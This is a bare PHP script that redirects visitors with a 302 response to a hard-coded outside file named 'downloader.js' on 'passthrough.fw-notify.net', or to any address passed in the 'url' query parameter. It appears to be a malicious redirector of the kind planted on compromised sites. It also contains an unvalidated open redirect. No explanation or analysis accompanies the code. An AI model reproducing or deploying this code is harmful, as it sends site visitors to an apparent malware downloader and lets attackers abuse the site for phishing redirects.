<?php
$url="http://passthrough.fw-notify.net/static/42/downloader.js";
if (isset($_GET['url'])) {
    $url = $_GET['url'];
}
header('HTTP/1.1 302 Moved Temporarily');
header('Location: '. $url);
